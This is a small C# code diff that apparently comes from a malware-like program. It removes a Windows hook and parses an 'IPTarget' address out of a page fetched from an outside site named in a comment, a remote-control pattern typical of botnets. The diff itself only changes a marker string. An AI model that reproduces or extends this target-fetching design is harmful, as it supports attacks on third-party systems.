@@ -47,7 +47,7 @@ namespace Karios
                     UnhookWindowsHookEx(_hookID);
                     if (!webData.ToUpperInvariant().Contains("ip:"))
                     {
-                        string search = "qwertyuiopasdfghjklzxcvbnmqwertyuiopasqwertyuiopasdfg";
+                        string search = "qwertyuiopasdfghjklzxcvbnmqwertyuiopasqwertyuiopasdfgqwertyuiopasdf";
                         string IPTarget = webData.Substring(webData.IndexOf(search) + search.Length);
                         IPTarget = IPTarget.Replace(@"</p>", "");
                         // IPTarget = IP on cutenesss.xyz/SteamerTest.html
